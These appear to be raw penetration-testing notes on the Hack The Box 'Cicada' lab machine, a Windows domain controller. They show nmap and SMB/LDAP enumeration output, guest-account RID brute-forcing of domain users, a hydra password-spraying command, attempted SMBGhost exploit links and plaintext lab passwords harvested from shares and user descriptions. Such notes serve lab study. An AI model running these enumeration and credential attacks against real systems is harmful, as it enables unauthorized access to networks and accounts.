IP:10.10.11.35

ldapdomaindump -r 10.10.11.35 -u 'cicada.htb\micheal.wrightson' -p 'Cicada$M6Corpb\*@Lp#nZp\!8'

```bash
❯ sudo nmap -sV --version-intensity 5 10.10.11.35
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-23 17:40 MST
Nmap scan report for 10.10.11.35
Host is up (0.060s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-24 07:41:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
```

nxc --target 10.10.11.35 --list-shares --username guest --password ""
nxc --target 10.10.11.35 --username guest --password "" --start-rid 500 --end-rid 550

hydra -L cicada/users.txtusers.txt -P Cicada$M6Corpb\*@Lp#nZp!8 ssh://10.10.11.35

smbclient //IP:10.10.11.35/<share_name> -U <username>

see if this LDAP server is vulnerable to a NULL base or anonymous bind. We will search for all Distinguished Names (DN) in the tree.

```
ldapsearch -x -b "dc=acme,dc=com" "*" -h 10.10.11.35 | awk '/dn: / {print $2}'
```

LDAP server pentesting: https://medium.com/@minimalist.ascent/pentesting-ldap-servers-25577bde675b

Feels like globalcatLDAP and globalcatLDAPssl are most likely the issues.

# HTTP

```bash
❯ gobuster dir -u http://10.10.11.35:5985 -w common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.35:5985
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

# Microsoft DS

https://support.microsoft.com/en-us/topic/ms08-068-vulnerability-in-smb-could-allow-remote-code-execution-cdd08c90-10d4-ca87-68d3-4841472ba1ec

```bash
❯ echo "exit" | smbclient -L 10.10.11.35
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\tom]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk
        HR              Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

```bash
❯ smbclient -L 10.10.11.35 -N -d 3
lp_load_ex: refreshing parameters
Initialising global parameters
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
added interface en0 ip=2601:282:2280:f8b0::7590 bcast= netmask=ffff:ffff:ffff:ffff::
added interface en0 ip=2601:282:2280:f8b0:49f:e030:249a:d9e0 bcast= netmask=ffff:ffff:ffff:ffff::
added interface en0 ip=2601:282:2280:f8b0:1417:6714:efcf:7cd1 bcast= netmask=ffff:ffff:ffff:ffff::
added interface en0 ip=10.0.0.120 bcast=10.0.0.255 netmask=255.255.255.0
Client started (version 4.21.1).
Connecting to 10.10.11.35 at port 445
Connecting to 10.10.11.35 at port 139
GENSEC backend 'gssapi_spnego' registered
GENSEC backend 'gssapi_krb5' registered
GENSEC backend 'gssapi_krb5_sasl' registered
GENSEC backend 'spnego' registered
GENSEC backend 'schannel' registered
GENSEC backend 'ncalrpc_as_system' registered
GENSEC backend 'sasl-EXTERNAL' registered
GENSEC backend 'ntlmssp' registered
GENSEC backend 'ntlmssp_resume_ccache' registered
GENSEC backend 'http_basic' registered
GENSEC backend 'http_ntlm' registered
GENSEC backend 'http_negotiate' registered
gensec_gse_client_start: Not using kerberos to cifs/10.10.11.35 as WORKGROUP\tom: NT_STATUS_INVALID_PARAMETER
Got challenge flags:
Got NTLMSSP neg_flags=0x62898215
NTLMSSP: Set final flags:
Got NTLMSSP neg_flags=0x62008215
NTLMSSP Sign/Seal - Initialising with flags:
Got NTLMSSP neg_flags=0x62008215

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk
        HR              Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

Version: Client started (version 4.21.1).

```bash
❯ sudo nmap -p445 --script smb-protocols 10.10.11.35
Password:
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-23 18:56 MST
Nmap scan report for 10.10.11.35
Host is up (0.056s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols:
|   dialects:
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
```

http://packetstormsecurity.com/files/157901/Microsoft-Windows-SMBGhost-Remote-Code-Execution.html
http://packetstormsecurity.com/files/158054/SMBleed-SMBGhost-Pre-Authentication-Remote-Code-Execution-Proof-Of-Concept.html

Good Example:
https://github.com/jamf/CVE-2020-0796-RCE-POC/blob/master/SMBleedingGhost.py

That failed looks like it is newer then the CVE.

Trying metasploit recon:
https://exploit.ph/active-directory-recon-1.html

```bash
❯ ldapsearch -x -h 10.10.11.35 -b "dc=cicada,dc=htb"
# extended LDIF
#
# LDAPv3
# base <dc=cicada,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090C78, comment: In order to perform this ope
 ration a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

```bash
❯ smbcacls //10.10.11.35/HR "Notice from HR.txt" -N
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:CICADA\Domain Users
ACL:CICADA\david.orelious:ALLOWED/I/R
ACL:CICADA\sarah.dantelia:ALLOWED/I/R
ACL:Everyone:ALLOWED/I/R
ACL:CICADA\Guest:ALLOWED/I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/I/FULL
ACL:BUILTIN\Administrators:ALLOWED/I/FULL
ACL:BUILTIN\Users:ALLOWED/I/READ
```

```bash
smbclient //10.10.11.35/HR -U "Guest%"
smbclient //10.10.11.35/C$ -N
```

```bash
[+] IP: 10.10.11.35:445 Name: 10.10.11.35               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                NO ACCESS        Logon server share
        SYSVOL                                                  NO ACCESS        Logon server share
```

```bash
pipx install git+https://github.com/Pennyw0rth/NetExec
```

```bash
❯ nxc smb 10.10.11.35 --username guest --password ""

SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
(cicada)
```

Successfully enumerated users using `netexec smb`:

```bash
❯ netexec smb 10.10.11.35 --shares -u 'guest' -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC     f
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

The user `michael.wrightson` uses the default password!

smbclient //10.10.11.35/SYSVOL -U 'CICADA\michael.wrightson%Cicada$M6Corpb\*@Lp#nZp!8'

Attempting to map the shares:

```bash
smbmap -H 10.10.11.35 -u "michael.wrightson" -p "Cicada\$M6Corpb*@Lp#nZp!8"
```

```bash
❯ ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35 -o ./cicadata/out2
```

Got the password from the description for david.orelious `aRt$Lp#7t*VQ!3`.
smbclient //10.10.11.35/DEV -U david.orelious

Got password from `Backup_script.ps1` in the DEV share.

`Q!3@Lp#M6b*7t*Vt`
